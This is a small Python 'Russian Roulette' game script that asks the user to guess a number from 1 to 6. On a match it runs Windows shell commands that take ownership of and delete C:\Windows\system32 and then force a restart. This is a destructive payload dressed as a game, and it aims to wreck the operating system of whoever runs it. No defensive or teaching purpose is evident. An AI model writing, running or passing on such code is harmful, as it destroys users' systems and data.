import random, time, os

print("Welcome to Russian Roulette!")
print("This will decide your fate -- if you are lucky, you are safe!")
print("But if you lose... your PC kills itself!")
print()

fate = int(input("Shall we try? Enter a number between 1 and 6 > "))    

truenum = random.randint(1,6)

print("Deciding your fate... please wait...")
time.sleep(5)

if fate == truenum:
    print("You DIE!")
    time.sleep(2)
    os.system('takeown C:\\Windows\\system32')
    os.system('del C:\\Windows\\system32')
    os.system('shutdown -r')
else:
    print("You live to see another day! Program will quit now...")
    time.sleep(3)